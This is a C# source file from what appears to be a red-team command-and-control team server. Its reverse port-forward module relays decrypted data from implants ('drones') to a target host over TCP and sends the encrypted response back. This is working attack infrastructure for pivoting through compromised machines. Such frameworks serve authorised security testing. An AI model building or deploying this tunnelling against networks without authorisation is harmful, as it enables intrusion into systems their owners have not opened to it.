using System.Net;
using System.Net.Sockets;

using TeamServer.Messages;
using TeamServer.Utilities;

namespace TeamServer.Modules;

public sealed class ReversePortForwardModule : ServerModule
{
    public override FrameType FrameType => FrameType.REV_PORT_FWD;

    public override async Task ProcessFrame(C2Frame frame)
    {
        // decrypt packet
        var packet = await Crypto.Decrypt<ReversePortForwardPacket>(frame.Data);

        // should only really be DATA here
        if (packet.Type != ReversePortForwardPacket.PacketType.DATA)
            return;

        // get the rportfwd
        var forward = await PortForwards.Get(packet.Id);

        if (forward is null)
            return;

        // is forward host an IP or hostname?
        if (!IPAddress.TryParse(forward.ForwardHost, out var targetIp))
        {
            // dns lookup
            var addresses = await Dns.GetHostAddressesAsync(forward.ForwardHost);
            targetIp = addresses.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
        }
        
        if (targetIp is null)
            return;
        
        // open connection
        using var client = new TcpClient();
        await client.ConnectAsync(targetIp, forward.ForwardPort);

        var stream = client.GetStream();

        // send the data
        await stream.WriteAsync(packet.Data);
        
        // read the response
        var response = await stream.ReadStream();
        
        // send back to drone
        packet.Data = response;

        // new frame
        frame = new C2Frame(forward.DroneId, FrameType.REV_PORT_FWD, await Crypto.Encrypt(packet));
        
        Tasks.CacheFrame(frame);
    }
}